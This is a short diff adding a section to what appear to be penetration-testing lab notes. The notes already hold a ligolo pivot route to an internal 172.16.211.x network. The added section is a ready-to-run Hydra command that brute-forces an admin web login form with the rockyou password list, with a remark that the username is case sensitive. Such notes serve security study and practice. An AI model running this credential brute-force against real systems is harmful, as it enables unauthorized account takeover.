@@ -29,3 +29,11 @@ Internal Network: 172.16.211.x
 - sudo ip route add 172.16.211.0/24 dev ligolo
 
 
+# Hydra
+
+```
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.129.233.134 http-post-form "/login.php:username=admin&password=^PASS^&Submit=Login:Incorrect information"
+```
+
+- username is case sensitive...
+
